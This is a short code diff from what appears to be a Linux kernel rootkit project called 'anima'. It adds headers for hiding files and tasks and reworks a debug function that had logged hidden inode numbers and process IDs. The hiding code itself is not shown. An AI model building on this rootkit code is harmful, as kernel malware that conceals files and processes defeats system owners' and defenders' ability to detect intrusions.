@@ -1,5 +1,7 @@
 #include <anima/config.h>
 #include <anima/debug.h>
+#include <anima/hide_file.h>
+#include <anima/hide_task.h>
 #include <anima/ksyms.h>
 #include <anima/syscalls.h>
 #include <anima/vfs.h>
@@ -11,18 +13,8 @@
 
 struct syscall_stat sys_stats[NR_SYSCALLS] = { {0} };
 
-void debug_rk(u64 *inodes, pid_t *pids)
+void debug_rk(void)
 {
-	pr_debug("%s: hidden inodes\n", __func__);
-	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
-		if (inodes[i])
-			pr_debug("\tino=%llu\n", inodes[i]);
-
-	pr_debug("%s: hidden pids\n", __func__);
-	for (int i = 0; i < MAX_HIDDEN_PIDS; i++)
-		if (pids[i])
-			pr_debug("\tpid=%d\n", pids[i]);
-
 	x86_hw_breakpoint_debug();
 	vfs_debug();
 }
@@ -42,7 +34,7 @@ void __debug(const char *func, const char *fmt, ...)
 {
 }
 
-void debug_rk(u64 *inodes, pid_t *pid)
+void debug_rk(void)
 {
 }
 
